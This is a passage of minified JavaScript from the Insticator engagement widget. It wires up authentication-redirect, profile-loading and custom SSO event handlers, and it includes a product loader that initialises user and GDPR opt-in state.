            redirectUrl: window.location.href,
            siteUUID: window.Insticator.siteUUID,
            cookieId: window.Insticator.user.cookieId
          };
          window.Insticator.publisherToken && (b.publisherToken = window.Insticator.publisherToken);
          window.location.assign("".concat("https://auth.instiengage.com/auth/app.html").concat((0, m.T)(b)));
        });
        (0, e.channel)("load-profile").subscribe(function (b) {
          window.Insticator.load("new-profile", b);
        });
        (0, e.channel)("custom-sso-open-auth").subscribe(function () {
          var b = window.Insticator.customSSOAuthCallback;
          b && "function" == typeof b && b();
        });
      }
    },
    l = {};
  h.d = function (e, a) {
    for (var g in a) h.o(a, g) && !h.o(e, g) && Object.defineProperty(e, g, {
      enumerable: !0,
      get: a[g]
    });
  };
  h.o = function (e, a) {
    return Object.prototype.hasOwnProperty.call(e, a);
  };
  h.r = function (e) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
      value: "Module"
    });
    Object.defineProperty(e, "__esModule", {
      value: !0
    });
  };
  (function (e) {
    if (!e.Insticator.productLoaderWorked) {
      e.Insticator.productLoaderWorked = !0;
      void 0 === e.Insticator.enableNewAuthFlow && (e.Insticator.enableNewAuthFlow = !0);
      var a = function () {
        h(155);
        h(133);
        h(14);
        var g = h(168).User,
          k = h(647).loadProduct,
          m = h(862),
          b = m.setUpQueueListener,
          d = m.processPreloadedQueue;
        e.Insticator.user = e.Insticator.user || {
          userUUID: null,
          showGDPRMessage: null
        };
        g = new g();
        g.checkUserData(function () {
          d(k);
          b(k);
        });
        e.Insticator.user.optUserIn = g.optUserIn;
      };
      document.body ? a() : window.addEventListener("DOMContentLoaded", a);
    }
  })(window);
}();